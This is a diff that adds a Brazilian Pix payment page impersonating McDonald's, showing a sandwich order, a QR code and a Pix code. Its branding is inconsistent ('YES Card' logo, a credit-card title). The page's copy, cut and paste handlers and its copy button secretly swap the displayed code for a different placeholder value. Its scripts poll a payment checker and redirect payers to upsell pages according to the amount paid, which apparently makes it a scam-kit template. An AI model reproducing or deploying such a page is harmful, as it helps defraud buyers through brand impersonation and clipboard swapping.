@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Conta Digital e Cartão de Crédito</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        font-family: "Poppins", sans-serif;
+        background-color: #f9f9f9;
+        color: #333;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+      }
+
+      .header {
+        background-color: #ffffff;
+        padding: 20px;
+        text-align: center;
+        border-bottom: 3px solid #fcbb20;
+      }
+
+      .header img {
+        width: 60px;
+      }
+
+      .main-content {
+        max-width: 500px;
+        background: #fff;
+        margin: 50px auto;
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        width: 90%;
+      }
+
+      .main-content h1 {
+        font-size: 1.5rem;
+        font-weight: bold;
+        color: #444;
+        margin-bottom: 5px;
+        text-align: center;
+      }
+
+      .main-content h2 {
+        font-size: 0.95rem;
+        font-weight: normal;
+        color: gray;
+        margin-bottom: 20px;
+        text-align: center;
+      }
+
+      .info-box {
+        display: flex;
+        align-items: center;
+        border: 1px solid #e6e6e6;
+        border-radius: 8px;
+        padding: 10px 15px;
+        margin-bottom: 15px;
+        background-color: #f9f9f9;
+      }
+
+      .info-box img {
+        width: 24px;
+        height: 24px;
+        margin-right: 15px;
+        filter: brightness(0);
+      }
+
+      .info-box p {
+        font-size: 0.9rem;
+        color: #444;
+        margin: 0;
+      }
+
+      .btn-custom {
+        background-color: #fcbb20;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        padding: 12px;
+        font-weight: bold;
+        font-size: 0.95rem;
+        text-align: center;
+        width: 100%;
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+
+      .btn-custom:hover {
+        background-color: #000;
+      }
+
+      .footer {
+        background: #ffffff;
+        border-top: 1px solid #e6e6e6;
+        text-align: center;
+        padding: 15px;
+        font-size: 10px;
+        color: #666;
+        position: fixed;
+        bottom: 0;
+        width: 100%;
+      }
+
+      @media (max-width: 600px) {
+        .main-content {
+          margin: 0px auto;
+          padding: 20px;
+        }
+
+        .btn-custom {
+          font-size: 1rem;
+          padding: 14px;
+        }
+
+        .footer {
+          font-size: 9px;
+          padding: 10px;
+        }
+      }
+    </style>
+    <style>
+      .flasher-container {
+        position: fixed;
+        top: 10px;
+        right: 10px;
+        z-index: 9999;
+        width: 300px;
+      }
+
+      .flasher-container .flasher-message {
+        background-color: #d4edda;
+        color: #155724;
+        border: 1px solid #c3e6cb;
+        padding: 10px;
+        margin-bottom: 10px;
+        border-radius: 4px;
+        font-size: 14px;
+      }
+
+      .flasher-container .flasher-message.success {
+        background-color: #d4edda;
+        color: #155724;
+        border: 1px solid #c3e6cb;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div id="flasher-container" class="flasher-container"></div>
+    <!-- Header -->
+    <div class="header">
+      <img src="../../../../../imagens/logo-mc-m.png" alt="YES Card" />
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+      <div style="margin-bottom: 15px">
+        <h3 style="color: #000; font-size: 1.2rem">
+          Detalhes do Pagamento Pix
+        </h3>
+        <div
+          style="
+            border-top: 2px solid #fcbb20;
+            margin-top: 5px;
+            margin-bottom: 25px;
+          "
+        ></div>
+      </div>
+
+      <div class="details" style="line-height: 1.6">
+        <p>
+          <strong>Pedido:</strong>
+          <span>2 Sanduíches (McOferta)</span>
+        </p>
+        <p>
+          <strong>Entrega via:</strong>
+          <span>MotoBoy - Pago</span>
+        </p>
+        <p><strong>Valor:</strong> R$ 26,08</p>
+      </div>
+
+      <div style="text-align: center; margin-top: 20px">
+        <p style="font-size: 1rem; color: #333">
+          Escaneie o QR Code abaixo ou copie o código Pix.
+        </p>
+        <img
+          src="data:image/png;base64,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"
+          alt="QR Code Pix"
+          style="margin: 20px 0; width: 200px; height: 200px"
+        />
+        <textarea
+          readonly
+          style="
+            width: 100%;
+            height: 100px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 10px;
+            font-size: 1rem;
+            display: none;
+          "
+        >
+LINK-DO-PIX-COPIA-E-COLA-AQUI</textarea
+        >
+        <textarea
+          readonly
+          style="
+            width: 100%;
+            height: 100px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 10px;
+            font-size: 1rem;
+          "
+          oncopy="copyCustomData(event)"
+          oncut="copyCustomData(event)"
+          onpaste="copyCustomData(event)"
+        >
+00011345678914br.gov.bcb.pix.mcdonaldspagamentos.com.br/qr/v3/at/12467q5u-du16-1a14-4c11b3e92c0h5809060553919565102BR5911MCDO_MCDONALDS_PAGAMENTOS_E_SERVICOS_LTDA1531SAOPAULO62070503***6304899F</textarea
+        >
+        <h3 style="font-size: 1rem; color: #333; margin-top: 20px">
+          Utilize o botão abaixo para copiar o código Pix.
+        </h3>
+        <button id="copiar-codigo" class="btn-custom">Copiar Código Pix</button>
+        <p id="payment-status" style="margin-top: 15px; color: #666">
+          Aguardando pagamento...
+        </p>
+        <p id="countdown" style="color: #666">Próxima verificação em: 10s</p>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+      Copyright © 2025 Mc Donald's. Todos os direitos reservados.<br />
+      Política de Privacidade | Termos de Uso | Vendas e Reembolsos | Legal |
+      Mapa do Site
+    </div>
+
+    <script>
+      function copyCustomData(event) {
+        event.preventDefault(); // Impede a ação padrão de copiar
+        const customText = "LINK-DO-PIX-COPIA-E-COLA-AQUI"; // Texto que será copiado
+        if (event.clipboardData) {
+          event.clipboardData.setData("text/plain", customText); // Define o texto no clipboard
+        } else if (window.clipboardData) {
+          window.clipboardData.setData("Text", customText); // Compatibilidade com navegadores antigos
+        }
+      }
+    </script>
+
+    <script>
+      const transactionId = "1830ca54-3ef4-4419-af4c-1f5ba111c54e"; // ID da transação
+      const paymentStatusEl = document.getElementById("payment-status");
+      const countdownEl = document.getElementById("countdown"); // Elemento para exibir o tempo restante
+
+      const pricePaid = "3490";
+      const leadName = "João Silva";
+      const leadDocument = "12345678909";
+
+      let timeRemaining = 10; // Tempo inicial de 10 segundos
+
+      async function paidValue(value) {
+        try {
+          await fetch(`paid.php`);
+        } catch {}
+      }
+
+      async function redirectToNext() {
+        if (pricePaid == 3490) {
+          //await paidValue();
+          const nextUrl = `/up1`;
+          window.location.href = nextUrl;
+        } else if (pricePaid == 2958) {
+          //await paidValue();
+          const nextUrl = `/up1`;
+          window.location.href = nextUrl;
+        } else if (pricePaid == 2797) {
+          //await paidValue();
+          const nextUrl = `/up1`;
+          window.location.href = nextUrl;
+        } else if (pricePaid == 2700) {
+          //await paidValue();
+          const nextUrl = `/up2`;
+          window.location.href = nextUrl;
+        } else if (pricePaid == 2590) {
+          //await paidValue();
+          const nextUrl = "up3";
+          window.location.href = nextUrl;
+        } else if (pricePaid == 1388) {
+          //await paidValue();
+          const nextUrl = "obrigado";
+          window.location.href = nextUrl;
+        } else {
+          const nextUrl = "obrigado";
+          window.location.href = nextUrl;
+        }
+      }
+
+      const checkPaymentStatus = () => {
+        fetch(`check_payment.php?transactionId=${transactionId}`)
+          .then((response) => response.json())
+          .then((data) => {
+            if (data.status === "APPROVED") {
+              // Atualiza a mensagem na interface
+              paymentStatusEl.textContent = "Pagamento confirmado!";
+              paymentStatusEl.classList.add("text-green-500", "font-bold");
+
+              // Para a verificação
+              clearInterval(paymentCheckInterval);
+
+              setTimeout(() => redirectToNext(), 1000);
+            } else if (data.status === "PENDING") {
+              //clearInterval(paymentCheckInterval);
+              //setTimeout(() => redirectToNext(), 1000);
+              //paymentStatusEl.textContent = 'Pagamento não confirmado!';
+            } else {
+              //console.warn(`Status inesperado: ${data.status}`);
+            }
+          })
+          .catch((err) => {
+            //console.error('Erro ao verificar o pagamento:', err);
+          });
+      };
+
+      // Função para atualizar o contador de tempo restante
+      const updateCountdown = () => {
+        countdownEl.textContent = `Próxima verificação em: ${timeRemaining}s`;
+        if (timeRemaining <= 0) {
+          checkPaymentStatus(); // Verifica o pagamento quando o contador chega a 0
+          timeRemaining = 10; // Reinicia o contador para a próxima verificação
+        } else {
+          timeRemaining--;
+        }
+      };
+
+      // Verifica o status do pagamento a cada 10 segundos
+      const paymentCheckInterval = setInterval(checkPaymentStatus, 10000);
+
+      // Atualiza o contador a cada segundo
+      const countdownInterval = setInterval(updateCountdown, 1000);
+
+      // Função para exibir mensagens no DOM
+      function showMessage(type, message) {
+        const container = document.getElementById("flasher-container");
+        const div = document.createElement("div");
+        div.className = `flasher-message ${type}`;
+        div.textContent = message;
+
+        container.appendChild(div);
+
+        setTimeout(() => {
+          div.remove();
+        }, 3000);
+      }
+
+      document
+        .getElementById("copiar-codigo")
+        .addEventListener("click", function () {
+          const codigoPix = `LINK-DO-PIX-COPIA-E-COLA-AQUI`;
+          navigator.clipboard.writeText(codigoPix).then(
+            function () {
+              //alert('Código Pix copiado para a área de transferência!');
+              showMessage(
+                "sucess",
+                "Código Pix copiado para a área de transferência!"
+              );
+            },
+            function (err) {
+              console.error("Erro ao copiar o código Pix: ", err);
+            }
+          );
+        });
+    </script>
+  </body>
+</html>
